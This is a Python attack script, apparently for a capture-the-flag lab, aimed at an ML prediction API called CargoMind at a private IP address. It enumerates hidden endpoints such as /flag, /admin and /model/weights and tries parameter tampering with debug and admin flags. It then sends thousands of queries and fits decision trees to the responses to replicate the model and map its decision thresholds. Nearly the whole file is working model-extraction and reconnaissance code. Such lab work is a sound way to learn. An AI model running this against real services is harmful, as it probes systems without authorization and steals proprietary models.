#!/usr/bin/env python3
"""
CargoMind v2 - Full extraction. Endpoint: /predict, /reset
"""
import json, random, itertools, requests, sys
import numpy as np
from collections import Counter, defaultdict

TARGET = "10.128.156.28"
BASE   = f"http://{TARGET}:8000"
EP     = "/predict"

try:
    from sklearn.tree import DecisionTreeClassifier, export_text
    from sklearn.preprocessing import LabelEncoder
    from sklearn.model_selection import cross_val_score
except ImportError:
    sys.exit("pip3 install scikit-learn requests numpy")

R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"; W="\033[0m"; B="\033[94m"
FEATURES = ["CM","SE","RR","OS","CT","MS"]

def q(feats):
    try:
        r = requests.post(f"{BASE}{EP}", json={"features": feats}, timeout=8)
        if r.status_code == 200:
            return r.json()
    except: pass
    return None

def reset():
    try: requests.post(f"{BASE}/reset", json={}, timeout=5)
    except: pass

# ── RECON ─────────────────────────────────────────────────────────────────
print(f"{R}=== RECON: Hidden endpoints ==={W}")
for ep in ["/flag","/flag1","/flag2","/flag3","/flags","/admin","/debug",
           "/model","/model/info","/model/export","/model/weights",
           "/model/parameters","/model/tree","/model/rules","/model/dump",
           "/api/flag","/health","/status","/info","/metrics","/config",
           "/secret","/introspect","/answer","/leak","/steal"]:
    for method in ["GET","POST"]:
        try:
            fn = requests.get if method=="GET" else requests.post
            r = fn(f"{BASE}{ep}", json={} if method=="POST" else None, timeout=4)
            if r.status_code not in [404,405]:
                print(f"{G}  [{method}] {ep} → {r.status_code}: {r.text[:300]}{W}")
        except: pass

print(f"\n{R}=== RECON: Special inputs ==={W}")
specials = {
    "all zeros"  : [0.0]*6,
    "all ones"   : [1.0]*6,
    "all 0.5"    : [0.5]*6,
    "negative"   : [-1.0]*6,
    "large"      : [999.0]*6,
    "alt 0/1"    : [0,1,0,1,0,1],
    "alt 1/0"    : [1,0,1,0,1,0],
}
for name, feats in specials.items():
    try:
        r = requests.post(f"{BASE}{EP}", json={"features": feats}, timeout=8)
        raw = r.text
        flaggy = "THM" in raw or "flag" in raw.lower()
        mark = f"{G}[FLAG?]{W} " if flaggy else "  "
        print(f"{mark}{name}: {raw[:200]}")
        for k,v in r.headers.items():
            if k.lower() not in ["content-type","content-length","date","server","connection"]:
                print(f"      HEADER {k}: {v}")
    except Exception as e:
        print(f"  {name}: {e}")

print(f"\n{R}=== RECON: Param tampering ==={W}")
tampering = [
    {"features":[0.5]*6, "explain": True},
    {"features":[0.5]*6, "debug": True},
    {"features":[0.5]*6, "verbose": True},
    {"features":[0.5]*6, "raw": True},
    {"features":[0.5]*6, "admin": True},
    {"features":[0.5]*6, "show_proba": True},
    {"features":[0.5]*7},
    {"features":[0.5]*6, "query_type":"explain"},
    {"CM":0.5,"SE":0.5,"RR":0.5,"OS":0.5,"CT":0.5,"MS":0.5},
]
for p in tampering:
    try:
        r = requests.post(f"{BASE}{EP}", json=p, timeout=6)
        raw = r.text
        flaggy = "THM" in raw or "flag" in raw.lower()
        mark = f"{G}[FLAG?]{W} " if flaggy else "  "
        print(f"{mark}{str(p)[:65]} → {raw[:200]}")
    except Exception as e:
        print(f"  {p}: {e}")

# ── DATA COLLECTION ──────────────────────────────────────────────────────
print(f"\n{C}=== DATA COLLECTION ==={W}")
data = []

# All 2^6 binary extremes
print("  Extremes (64 combos)...")
for combo in itertools.product([0.0,1.0], repeat=6):
    resp = q(list(combo))
    if resp: data.append({"features":list(combo),**resp})

# Sweep each feature 0→1, others fixed at 0 and also at 0.5 and 1
print("  Single-feature sweeps...")
for fi in range(6):
    for base_val in [0.0, 0.5, 1.0]:
        for v in np.linspace(0, 1, 200):
            feats = [base_val]*6
            feats[fi] = round(float(v), 4)
            resp = q(feats)
            if resp: data.append({"features":feats,**resp})

# Random
print("  Random sampling (1000)...")
for i in range(1000):
    feats = [round(random.uniform(0,1),4) for _ in range(6)]
    resp = q(feats)
    if resp: data.append({"features":feats,**resp})
    if (i+1)%200==0:
        print(f"    {i+1}/1000 | {dict(Counter(d.get('classification') for d in data))}")

print(f"\n{G}Total samples: {len(data)}{W}")
print(f"Classifications: {dict(Counter(d.get('classification') for d in data))}")
print(f"Risk bands: {dict(Counter(d.get('risk_band') for d in data))}")

# Scan for flags in responses
print(f"\n{R}=== SCANNING RESPONSES FOR FLAGS ==={W}")
for d in data:
    s = str(d)
    if "THM" in s or ("{"in s and "}"in s and "_"in s and "features" not in s[:20]):
        print(f"{G}[!!!] {d}{W}")

# ── MODEL REPLICATION ────────────────────────────────────────────────────
print(f"\n{C}=== MODEL REPLICATION ==={W}")
X = np.array([d["features"] for d in data])
y_cls  = [d.get("classification","?") for d in data]
y_risk = [d.get("risk_band","?") for d in data]

le_c = LabelEncoder(); le_r = LabelEncoder()
yc = le_c.fit_transform(y_cls)
yr = le_r.fit_transform(y_risk)

print(f"Classes:    {list(le_c.classes_)}")
print(f"Risk bands: {list(le_r.classes_)}")

for label_enc, le, tag, y_raw in [(yc,le_c,"CLASSIFICATION",y_cls),(yr,le_r,"RISK_BAND",y_risk)]:
    if len(set(label_enc)) < 2:
        print(f"  [{tag}] Only one class seen — can't train. ({Counter(y_raw)})")
        continue
    best_m, best_acc = None, 0
    for depth in [3,5,7,10,15,None]:
        dt = DecisionTreeClassifier(max_depth=depth, random_state=42)
        cv = min(5, len(data)//20+1)
        try:
            sc = cross_val_score(dt,X,label_enc,cv=cv).mean()
            if sc > best_acc:
                best_acc = sc
                best_m = DecisionTreeClassifier(max_depth=depth, random_state=42)
                best_m.fit(X, label_enc)
        except: pass
    if best_m is None: continue
    train_acc = best_m.score(X, label_enc)
    print(f"\n{G}[{tag}] Train acc: {train_acc:.4f}  CV acc: {best_acc:.4f}{W}")
    print(f"\n{Y}Decision Tree [{tag}]:{W}")
    print(export_text(best_m, feature_names=FEATURES))
    print(f"\n{Y}Feature importances [{tag}]:{W}")
    for fname,imp in zip(FEATURES, best_m.feature_importances_):
        print(f"  {fname}: {imp:.4f}  {'█'*int(imp*40)}")
    tree = best_m.tree_
    thresh = defaultdict(set)
    for i in range(tree.node_count):
        fi = tree.feature[i]
        if fi >= 0:
            thresh[FEATURES[fi]].add(round(tree.threshold[i],8))
    print(f"\n{Y}Decision thresholds [{tag}]:{W}")
    for fname,vals in thresh.items():
        print(f"  {fname}: {sorted(vals)}")

# ── PRECISE BOUNDARY SCAN ────────────────────────────────────────────────
print(f"\n{C}=== PRECISE BOUNDARY SCAN (2000 pts per feature) ==={W}")
for fi, fname in enumerate(FEATURES):
    prev = None; bounds = []
    for v in np.linspace(0, 1, 2000):
        feats = [0.5]*6; feats[fi] = round(float(v), 5)
        resp = q(feats)
        if resp and resp != prev:
            bounds.append((round(float(v),5), resp))
            prev = resp
    print(f"\n  {fname} transitions:")
    for bv, br in bounds:
        ascii_v = int(bv * 127)
        ch = chr(ascii_v) if 32<=ascii_v<=126 else "?"
        print(f"    {bv:.5f} → {br}   [ASCII {ascii_v} = '{ch}']")

with open("cargomind_full.json","w") as f:
    json.dump(data, f)
print(f"\n{G}Saved {len(data)} samples to cargomind_full.json{W}")
